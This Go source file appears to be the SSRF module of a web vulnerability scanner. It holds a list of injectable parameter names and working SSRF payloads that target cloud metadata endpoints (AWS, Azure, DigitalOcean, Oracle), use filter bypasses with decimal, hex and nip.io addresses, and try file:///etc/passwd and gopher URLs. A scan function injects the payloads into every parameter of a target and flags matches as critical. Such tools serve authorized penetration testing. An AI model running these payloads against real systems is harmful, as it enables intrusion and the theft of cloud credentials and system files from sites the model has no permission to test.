package ssrf

import (
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
	"sync"

	"github.com/yupiyy/bhyakugan/internal/core"
	"github.com/yupiyy/bhyakugan/internal/utils"
)

type SSRFPayload struct {
	Name    string
	Payload string
	Check   string 
}

var SSRFParams = []string{
	"url", "u", "next", "path", "dest", "destination", "redirect", "uri",
	"callback", "checkout", "feed", "download", "document", "folder",
	"root", "inc", "include", "require", "api", "rest", "source", "src",
	"data", "base", "file", "page", "template", "layout", "view", "dir",
	"action", "command", "exec", "query", "q", "search", "s",
}

var SSRFPayloads = []SSRFPayload{
	{"SSRF Cloud (AWS/GCP)", "http://169.254.169.254/latest/meta-data/", "ami-id"},
	{"SSRF Cloud (Azure)", "http://169.254.169.254/metadata/instance?api-version=2021-02-01", "compute"},
	{"SSRF Cloud (DigitalOcean)", "http://169.254.169.254/metadata/v1.json", "droplet_id"},
	{"SSRF Cloud (Oracle)", "http://192.0.0.192/1.0/meta-data/", "instance"},
	{"SSRF Cloud (nip.io bypass)", "http://169.254.169.254.nip.io/latest/meta-data/", "ami-id"},
	{"SSRF Cloud (Decimal)", "http://2852039166/latest/meta-data/", "ami-id"},
	{"SSRF Localhost (IPv4)", "http://127.0.0.1:80", "root:x:"}, 
	{"SSRF Localhost (Hex)", "http://0x7f000001", "root:x:"},
	{"SSRF Localhost (CIDR)", "http://127.127.127.127", "root:x:"},
	{"SSRF File Scheme", "file:///etc/passwd", "root:x:"},
	{"SSRF Gopher (DNS Leak)", "gopher://127.0.0.1:80/_GET%20/ HTTP/1.1", "root:x:"},
}

func Scan(baseURL string, client *http.Client, onFound func(core.Finding)) {
	u, _ := url.Parse(baseURL)
	q := u.Query()

	testParams := make(map[string]string)
	if len(q) == 0 {
		if strings.Contains(baseURL, "redirect") || strings.Contains(baseURL, "fetch") || strings.Contains(baseURL, "url") {
			for _, sp := range SSRFParams { testParams[sp] = "1" }
		}
	} else {
		for param := range q { testParams[param] = q.Get(param) }
	}

	reqBase, _ := http.NewRequest("GET", baseURL, nil)
	utils.SetDefaultHeaders(reqBase, baseURL)
	baseResp, _ := client.Do(reqBase)
	baseBody := ""
	if baseResp != nil {
		defer baseResp.Body.Close()
		b, _ := io.ReadAll(baseResp.Body)
		baseBody = strings.ToLower(string(b))
	}

	var wg sync.WaitGroup
	sem := make(chan struct{}, 5) 

	for targetParam := range testParams {
		for _, payload := range SSRFPayloads {
			wg.Add(1)
			go func(pName string, pay SSRFPayload) {
				defer wg.Done()
				sem <- struct{}{}
				defer func() { <-sem }()

				fuzzU, _ := url.Parse(baseURL)
				fuzzQ := fuzzU.Query()
				for k, v := range testParams { fuzzQ.Set(k, v) }
				fuzzQ.Set(pName, pay.Payload)
				fuzzU.RawQuery = fuzzQ.Encode()
				target := fuzzU.String()

				req, _ := http.NewRequest("GET", target, nil)
				utils.SetDefaultHeaders(req, target)
				resp, err := client.Do(req)
				if err != nil { return }
				defer resp.Body.Close()

				bodyBytes, _ := io.ReadAll(resp.Body)
				bodyStr := strings.ToLower(string(bodyBytes))

				if strings.Contains(bodyStr, strings.ToLower(pay.Check)) {
					if baseBody != "" && strings.Contains(baseBody, strings.ToLower(pay.Check)) { return }
					
					onFound(core.Finding{
						Type:     "SSRF Injection",
						Target:   target,
						Detail:   fmt.Sprintf("%s confirmed. Found output '%s'", pay.Name, pay.Check),
						Severity: "Critical",
					})
				}
			}(targetParam, payload)
		}
	}
	wg.Wait()
}
